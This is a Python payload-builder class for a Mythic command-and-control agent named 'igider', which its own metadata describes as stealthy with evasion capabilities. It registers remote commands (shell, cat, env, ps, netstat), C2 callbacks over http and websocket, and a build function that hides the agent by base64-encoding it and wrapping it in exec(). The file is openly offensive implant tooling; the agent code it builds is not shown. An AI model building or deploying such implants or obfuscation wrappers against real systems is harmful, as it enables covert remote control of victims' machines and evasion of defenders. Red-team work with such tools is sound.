from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio
import os
import json
from commands.shell import ShellCommand
from commands.whoami import WhoamiCommand
from commands.cat import CatCommand
from commands.ls import LsCommand
from commands.cd import CdCommand
from commands.pwd import PwdCommand
from commands.env import EnvCommand
from commands.hostname import HostnameCommand
from commands.ps import PsCommand
from commands.netstat import NetstatCommand
from commands.exit import ExitCommand

# Define the igider Agent class for Mythic
class igiderAgent(PayloadType):
    name = "igider"
    file_extension = "py"
    author = "Mythic Agent Developer"
    supported_os = [
        SupportedOS.Windows,
        SupportedOS.Linux,
        SupportedOS.MacOS
    ]
    supported_commands = [
        ShellCommand,
        WhoamiCommand,
        CatCommand,
        LsCommand,
        CdCommand,
        PwdCommand,
        EnvCommand,
        HostnameCommand,
        PsCommand,
        NetstatCommand,
        ExitCommand
    ]
    wrapper = False
    wrapped_payloads = []
    agent_path = Path("igider")
    agent_code_path = Path("igider") / "agent_code"
    agent_icon_path = Path("igider") / "icon.svg" 
    note = "A stealthy Python-based Mythic agent with evasion capabilities"
    supports_dynamic_loading = True
    build_parameters = [
        BuildParameter(
            name="version",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose the Python version to target",
            choices=["3.8", "3.9", "3.10", "3.11"],
            default_value="3.9",
        ),
        BuildParameter(
            name="use_encryption",
            parameter_type=BuildParameterType.Boolean,
            description="Encrypt communications with the C2",
            default_value=True,
        ),
        BuildParameter(
            name="debug",
            parameter_type=BuildParameterType.Boolean,
            description="Enable debug output",
            default_value=False,
        ),
        BuildParameter(
            name="obfuscate",
            parameter_type=BuildParameterType.Boolean,
            description="Obfuscate the agent code",
            default_value=True,
        ),
        BuildParameter(
            name="callback_interval",
            parameter_type=BuildParameterType.Number,
            description="Callback interval in seconds",
            default_value=5,
        ),
        BuildParameter(
            name="kill_date",
            parameter_type=BuildParameterType.Date,
            description="Date after which the agent will stop functioning",
            default_value=None,
            required=False,
        )
    ]
    c2_profiles = ["http", "websocket"]
    support_browser_scripts = True
    translation_container = None

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)

        try:

            with open(self.agent_code_path/"igider_main.py", "r") as f:
                agent_code = f.read()

            with open(self.agent_code_path/"igider_encryption.py", "r") as f:
                encryption_code = f.read()
            use_encryption = self.get_parameter("use_encryption")
            debug = self.get_parameter("debug")
            obfuscate = self.get_parameter("obfuscate")
            callback_interval = self.get_parameter("callback_interval")
            kill_date = self.get_parameter("kill_date")
            config = {
                "use_encryption": use_encryption,
                "debug": debug,
                "callback_interval": callback_interval,
                "kill_date": kill_date
            }
            agent_code = agent_code.replace("#{AGENT_CONFIG}#", json.dumps(config))

            # Apply obfuscation
            if obfuscate:
                agent_code = self._obfuscate_code(agent_code)

            # Set the output
            resp.payload = agent_code
            resp.build_message = "Agent built successfully!"

        except Exception as e:
            resp.status = BuildStatus.Error
            resp.build_message = f"Error building agent: {str(e)}"

        return resp

    def _obfuscate_code(self, code: str) -> str:
        # obfuscation technique to improve !!!!
        import base64
        encoded = base64.b64encode(code.encode()).decode()
        return f"""
import base64
exec(base64.b64decode('{encoded}').decode())
"""